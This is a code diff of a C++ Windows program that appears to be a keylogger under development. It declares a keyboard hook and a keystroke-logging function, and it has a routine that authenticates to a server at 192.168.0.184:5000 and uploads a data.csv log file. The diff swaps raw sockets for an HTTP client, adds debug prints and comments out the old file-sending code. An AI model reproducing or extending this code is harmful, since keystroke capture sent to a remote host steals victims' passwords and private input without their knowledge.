@@ -30,7 +30,7 @@ void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp);
 static void initialize_hook_thread();
 static void begin_file_transfer(std::string userName, std::string password);
 bool hash_password(std::string pass, std::string* outPass);
-bool authorize_user(SOCKET *connectionSocket, std::string userName, std::string password);
+bool authorize_user(HttpClass *connectionSocket, std::string userName, std::string password);
 
 DWORD lastKey = 0x0;
 DWORD lastAction = 0x0;
@@ -410,20 +410,18 @@ bool authorize_user(HttpClass *http, std::string userName, std::string password)
 	std::string constructedPost;
 	constructedPost = "username=" + userName;
 	constructedPost += "&passHash=" + password;
+	printf("OK");
 
-	char *sRecv = new char[256];
 
-	http->PostHTTP("/user/login", "application/x-www-form-urlencoded", constructedPost);
-	http->ReceiveData(sRecv, sizeof(sRecv));
-	std::string responseData(sRecv);
-	if (responseData.find("200") != std::string::npos)
+	std::string Response = http->PostHTTP("/user/login", "application/x-www-form-urlencoded", constructedPost);
+	if (Response.find("200") != std::string::npos)
 	{
 		printf("Successfully authorized user\n");
 		return true;
 	}
 	else
 	{
-		printf("Error occured.\n[Response]: %s\n", responseData.c_str());
+		printf("Error occured.\n[Response]: %s\n", Response.c_str());
 		return false;
 	}
 
@@ -490,9 +488,11 @@ bool authorize_user(HttpClass *http, std::string userName, std::string password)
 }
 
 
+
 static void begin_file_transfer(std::string userName, std::string password)
 {
-
+	httpClass = new HttpClass("192.168.0.184", 5000);
+	printf("OKOK\n");
 	std::string outPass; // Hash our password
 	if(!hash_password(password, &outPass))
 	{
@@ -500,7 +500,7 @@ static void begin_file_transfer(std::string userName, std::string password)
 		return;
 	}
 
-	WSADATA* wsaData = new WSADATA;
+	/*WSADATA* wsaData = new WSADATA;
 	struct addrinfo* result = NULL,
 		* ptr = NULL,
 		hints;
@@ -546,14 +546,14 @@ static void begin_file_transfer(std::string userName, std::string password)
 		ConnectionSocket = INVALID_SOCKET;
 		WSACleanup();
 		return;
-	}
+	}*/
 
-	if (!(authorize_user(&ConnectionSocket, userName, outPass)))
+	if (!(authorize_user(httpClass, userName, outPass)))
 	{
 		printf("Bad authentication details...\n");
-		closesocket(ConnectionSocket);
-		ConnectionSocket = INVALID_SOCKET;
-		WSACleanup();
+		//closesocket(ConnectionSocket);
+		//ConnectionSocket = INVALID_SOCKET;
+		//WSACleanup();
 		return;
 	}
 
@@ -567,7 +567,7 @@ static void begin_file_transfer(std::string userName, std::string password)
 	}*/
 
 
-	
+	/*
 
 	std::ifstream sendFile("data.csv", std::ifstream::in);
 	//printf("0x%08x\n", (DWORD&)sendFile);
@@ -607,4 +607,5 @@ static void begin_file_transfer(std::string userName, std::string password)
 	sendFile.close();
 	closesocket(ConnectionSocket);
 	WSACleanup();
+	*/
 }
